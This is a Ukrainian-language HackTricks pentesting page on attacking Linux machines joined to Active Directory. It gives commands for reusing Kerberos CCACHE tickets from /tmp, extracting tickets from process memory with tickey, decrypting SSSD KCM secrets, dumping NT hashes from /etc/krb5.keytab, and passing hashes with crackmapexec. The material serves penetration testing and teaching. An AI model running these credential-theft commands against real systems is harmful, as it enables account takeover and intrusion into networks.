# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Linux-машина також може бути присутня в середовищі Active Directory.

Linux-машина в AD може **зберігати різні CCACHE квитки всередині файлів. Ці квитки можуть бути використані та зловживані, як і будь-який інший kerberos квиток**. Щоб прочитати ці квитки, вам потрібно бути власником квитка або **root** на машині.

## Enumeration

### AD enumeration from linux

Якщо у вас є доступ до AD в linux (або bash в Windows), ви можете спробувати [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) для перерахунку AD.

Ви також можете перевірити наступну сторінку, щоб дізнатися **інші способи перерахунку AD з linux**:

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA є відкритим **альтернативою** Microsoft Windows **Active Directory**, в основному для **Unix** середовищ. Він поєднує в собі повний **LDAP каталог** з MIT **Kerberos** Центром Розподілу Ключів для управління, подібним до Active Directory. Використовуючи систему сертифікатів Dogtag для управління сертифікатами CA та RA, він підтримує **багатофакторну** аутентифікацію, включаючи смарт-карти. SSSD інтегровано для процесів аутентифікації Unix. Дізнайтеся більше про це на:

{{#ref}}
../freeipa-pentesting.md
{{#endref}}

## Playing with tickets

### Pass The Ticket

На цій сторінці ви знайдете різні місця, де ви могли б **знайти kerberos квитки всередині linux хоста**, на наступній сторінці ви можете дізнатися, як перетворити ці формати CCache квитків у Kirbi (формат, який вам потрібно використовувати в Windows) і також як виконати атаку PTT:

{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

### CCACHE ticket reuse from /tmp

CCACHE файли є бінарними форматами для **зберігання Kerberos облікових даних**, зазвичай зберігаються з правами 600 у `/tmp`. Ці файли можна ідентифікувати за їх **форматом імені, `krb5cc_%{uid}`,** що відповідає UID користувача. Для перевірки квитка аутентифікації, **змінна середовища `KRB5CCNAME`** повинна бути встановлена на шлях до бажаного файлу квитка, що дозволяє його повторне використання.

Перерахуйте поточний квиток, що використовується для аутентифікації, за допомогою `env | grep KRB5CCNAME`. Формат є портативним, і квиток може бути **повторно використаний, встановивши змінну середовища** за допомогою `export KRB5CCNAME=/tmp/ticket.ccache`. Формат імені квитка Kerberos - `krb5cc_%{uid}`, де uid - це UID користувача.
```bash
# Find tickets
ls /tmp/ | grep krb5cc
krb5cc_1000

# Prepare to use it
export KRB5CCNAME=/tmp/krb5cc_1000
```
### CCACHE квитки повторного використання з keyring

**Квитки Kerberos, збережені в пам'яті процесу, можуть бути витягнуті**, особливо коли захист ptrace на машині вимкнений (`/proc/sys/kernel/yama/ptrace_scope`). Корисний інструмент для цієї мети можна знайти за адресою [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), який полегшує витяг, інжектуючи в сесії та скидаючи квитки в `/tmp`.

Щоб налаштувати та використовувати цей інструмент, слід виконати наведені нижче кроки:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Ця процедура намагатиметься інжектувати в різні сесії, вказуючи на успіх, зберігаючи витягнуті квитки в `/tmp` з іменуванням `__krb_UID.ccache`.

### Повторне використання квитків CCACHE з SSSD KCM

SSSD підтримує копію бази даних за шляхом `/var/lib/sss/secrets/secrets.ldb`. Відповідний ключ зберігається як прихований файл за шляхом `/var/lib/sss/secrets/.secrets.mkey`. За замовчуванням ключ доступний лише для читання, якщо у вас є **root** права.

Виклик \*\*`SSSDKCMExtractor` \*\* з параметрами --database та --key розпарсить базу даних та **дешифрує секрети**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
**Кеш облікових даних Kerberos можна перетворити на використовуваний файл Kerberos CCache**, який можна передати до Mimikatz/Rubeus.

### Повторне використання квитка CCACHE з keytab
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### Витягти облікові записи з /etc/krb5.keytab

Ключі облікових записів служб, які є необхідними для служб, що працюють з привілеями root, надійно зберігаються у файлах **`/etc/krb5.keytab`**. Ці ключі, подібно до паролів для служб, вимагають суворої конфіденційності.

Щоб перевірити вміст файлу keytab, можна використовувати **`klist`**. Цей інструмент призначений для відображення деталей ключа, включаючи **NT Hash** для автентифікації користувачів, особливо коли тип ключа визначено як 23.
```bash
klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
# Output includes service principal details and the NT Hash
```
Для користувачів Linux, **`KeyTabExtract`** пропонує функціональність для витягування RC4 HMAC хешу, який можна використовувати для повторного використання NTLM хешу.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
На macOS **`bifrost`** слугує інструментом для аналізу файлів keytab.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Використовуючи витягнуту інформацію про облікові записи та хеші, можна встановити з'єднання з серверами за допомогою інструментів, таких як **`crackmapexec`**.
```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```
## Посилання

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

{{#include ../../banners/hacktricks-training.md}}
